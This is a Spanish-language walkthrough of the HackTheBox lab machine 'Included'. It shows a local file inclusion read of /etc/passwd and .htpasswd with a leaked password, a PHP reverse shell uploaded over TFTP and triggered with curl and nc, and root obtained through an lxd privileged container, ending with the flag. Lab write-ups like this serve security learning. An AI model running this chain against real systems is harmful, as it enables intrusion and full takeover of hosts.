# Included

Plataforma: HackTheBox
OS: Linux
Level: Very Easy
Status: Done
Complete: Yes
Created time: 10 de enero de 2025 23:37
IP: 10.129.50.109

## Recopilación de información

<aside>
💡

</aside>

### **Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

---

```bash
❯ sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.129.50.109 -oG allports

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63

❯ sudo nmap -sU 10.129.50.109
PORT   STATE SERVICE REASON
69/udp open|filtered  tftp
```

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

---

```bash
❯ sudo nmap -p80 -sCV 10.129.50.109 -oN targeted
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-title: Site doesnt have a title (text/html; charset=UTF-8).
|_Requested resource was http://10.129.50.109/?file=home.php
|_http-server-header: Apache/2.4.29 (Ubuntu)

sudo nmap -p80 --script=http-enum 10.129.50.109
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-10 23:52 CET
Nmap scan report for 10.129.50.109
Host is up (0.086s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
```

- **Identificación de vulnerabilidades**
    - 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

- **Enumeración Web**
    
    ![image.png](<imagenes/image 89.png>)
    
    Whatweb
    
    ```sql
     whatweb 10.129.50.109
    http://10.129.50.109 [302 Found] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.129.50.109], RedirectLocation[http://10.129.50.109/index.php?file=home.php]
    http://10.129.50.109/index.php?file=home.php [301 Moved Permanently] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.129.50.109], RedirectLocation[http://10.129.50.109/?file=home.php], Title[301 Moved Permanently]
    http://10.129.50.109/?file=home.php [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.129.50.109]
    ```
    
    Al ver la web, observamos en el navegador:
    
    ```sql
    http://10.129.50.109/?file=home.php#
    ```
    
    Provamos un LFI
    
    ```html
    http://10.129.50.109/?file=../../../../../etc/passwd
    
    root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false mike:x:1000:1000:mike:/home/mike:/bin/bash tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin 
    ```
    
    Buscamos en el fichero algun usuario valido:
    
    ```html
    cat passwd | grep /bin/bash:
    
    mike:x:1000:1000:mike:/home/mike:/bin/bash
    ```
    
    Usuario : mike
    
    La pregunta de HTB nos pregunta que fichero de configuración del servidor web nos permite hacer un movimiento lateral.
    
    Revisamos los archivos y probamos a listar el .htpasswd 
    
    ```html
    mike:Sheffield19 
    ```
    

## Explotación

<aside>
💡

</aside>

### Explotación 1

Una vez tenemos las credenciales de un usuario, podemos probar a conectarnos por tftp y subier una rever shell

```bash
# Copiamos la rever shell en el mismo directorio que ejecutamos tftp (shell.php)

tftp 10.129.50.109
put shell.php
exit
```

Como sabemos que el directorio por defecto de tftp es /var/lib/tftpboot, ejecutamos la rever desde alli:

```html
# Maquina atacanta
nc -lvnp 4444

❯ curl 'http://10.129.50.109/?file=/var/lib/tftpboot/shell.php'

Obtenemos rever shell:

www-data@included:/$ su mike

# Migramos a usuario mike con las credenciales anteriores

mike@included:/$
```

## Explotación posterior

### Escalada de privilegios

Una vez como usuario mike

```bash
mike@included:/$ id
uid=1000(mike) gid=1000(mike) groups=1000(mike),108(lxd)
mike@included:/$ groups
mike lxd
```

Nos encontramos dentro de nun contenedor LXD :

LXD is a management API for dealing with LXC containers on Linux systems. It will
perform tasks for any members of the local lxd group. It does not make an effort to
match the permissions of the calling user to the function it is asked to perform.

Seguimos los pasos del writeup

Instalamos GO

```bash
sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
```

Clonams la distro LXC Distribution Builder

```bash
git clone https://github.com/lxc/distrobuilder
cd distrobuilder
make
```

Descargamos ALpine YAML file

```bash
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18

❯ ls
 test   alpine.yaml   incus.tar.xz   rootfs.squashfs

❯ python3 -m http.server 8000
```

En la maquina victima

```bash
mike@included:~$ wget http://10.10.16.103:8000/incus.tar.xz
mike@included:~$ wget http://10.10.16.103:8000/rootfs.squashfs

mike@included:~$ lxc image import incus.tar.xz rootfs.squashfs --alias alpine

Image imported with fingerprint: e355934fd3991d51b0f31fcb1c8f986c464fbec5a577f83
mike@included:~$ lxc image list
+--------+--------------+--------+-----------------------------------------+--------+--------+-------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |               DESCRIPTION               |  ARCH  |  SIZE  |          UPLOAD DATE          |
+--------+--------------+--------+-----------------------------------------+--------+--------+-------------------------------+
| alpine | e355934fd399 | no     | Alpinelinux 3.18 x86_64 (20250111_0008) | x86_64 | 2.95MB | Jan 11, 2025 at 12:15am (UTC) |
+--------+--------------+--------+-----------------------------------------+--------+--------+-------------------------------+
mike@included:~$ lxc init alpine privesc -c security.privileged=true
Creating privesc
<st-root disk source=/ path=/mnt/root recursive=true
Device host-root added to privesc
mike@included:~$ lxc start privesc
mike@included:~$ lxc exec privesc /bin/sh
~ # whoami
root
~ # cd /mnt/root
/mnt/root # ls
bin             initrd.img.old  proc            tmp
boot            lib             root            usr
cdrom           lib64           run             var
dev             lost+found      sbin            vmlinuz
etc             media           snap            vmlinuz.old
home            mnt             srv
initrd.img      opt             sys
/mnt/root # cd root/
/mnt/root/root # ls
root.txt
/mnt/root/root # cat root.txt 
c693d9c7499d9f572ee375d4c14c7bcf
```

Flag : c693d9c7499d9f572ee375d4c14c7bcf

## Conclusión

<aside>
💡 Maquina resuelta con Writteup, ya que no conocia la explotacion de LXD

</aside>